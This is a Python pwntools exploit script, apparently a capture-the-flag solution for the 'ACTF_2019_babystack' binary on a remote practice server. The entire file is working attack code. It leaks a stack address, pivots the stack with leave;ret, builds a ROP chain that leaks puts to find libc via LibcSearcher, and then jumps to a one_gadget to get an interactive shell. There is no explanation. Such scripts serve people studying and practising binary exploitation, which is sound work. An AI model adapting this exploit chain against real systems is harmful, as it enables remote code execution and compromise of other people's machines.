#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
sh = process("./ACTF_2019_babystack")
sh = remote("node3.buuoj.cn",29170)
elf = ELF("./ACTF_2019_babystack")
leave_ret = 0x400A18
pop_rdi = 0x400ad3
main_addr = 0x4008F6
sh.recvuntil("How many bytes of your message?")
sh.recvuntil(">")
sh.sendline("224")
sh.recvuntil("Your message will be saved at 0x")
s_addr = int(sh.recv(12),16)
log.info("success leak s_addr:0x%x"%s_addr)
payload = p64(0)+p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr)
payload = payload.ljust(208,"\x00") + p64(s_addr) + p64(leave_ret)
sh.send(payload)
sh.recvuntil("Byebye~\n")
put_addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("success leak put_addr:0x%x"%put_addr)
libc = LibcSearcher("puts",put_addr)
libc_base = put_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
sh.recvuntil("How many bytes of your message?")
sh.recvuntil(">")
sh.sendline("224")
sh.recvuntil("Your message will be saved at 0x")
s_addr = int(sh.recv(12),16)
log.info("success leak s_addr:0x%x"%s_addr)
one_gadget = libc_base + 0x4f2c5
payload = 'a' * 8 + p64(one_gadget)
payload = payload.ljust(208,"\x00") + p64(s_addr) + p64(leave_ret)
sh.send(payload)    
sh.interactive()
